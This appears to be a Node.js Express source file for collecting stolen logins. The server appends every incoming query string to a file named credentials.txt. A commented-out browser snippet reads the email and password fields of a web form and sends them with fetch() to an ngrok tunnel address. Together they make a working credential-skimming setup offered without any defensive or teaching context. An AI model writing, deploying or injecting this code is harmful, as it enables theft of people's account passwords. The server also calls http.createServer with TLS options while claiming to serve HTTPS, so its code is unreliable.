const express = require('express');
const fs = require('fs');
const http = require('http');
const app = express();
const cors = require('cors');

app.use(cors());

app.get('/', function (req, res) {
  console.log(req.query);
  const output = JSON.stringify(req.query);
  fs.appendFileSync('credentials.txt', `${output}\n`, (err) => {console.log(err)});
  res.send('Fuck U!');
})

http.createServer({
  key: fs.readFileSync('server.key'),
  cert: fs.readFileSync('server.cert')
}, app)
.listen(3000, function () {
  console.log('Example app listening on port 3000! Go to https://localhost:3000/');
})


//openssl req -nodes -new -x509 -keyout server.key -out server.cert

/*
document.querySelector('form button').addEventListener('click',function(e){
   let email = document.querySelectorAll('form input')[0].value // getElementById('f293281b7d48108').value;
   let password = document.querySelectorAll('form input')[1].value  //document.getElementById('f26a33c68b9c2f4').value;
   fetch('https://25b758bc.ngrok.io?email='+email+'&password=' + password);});
*/
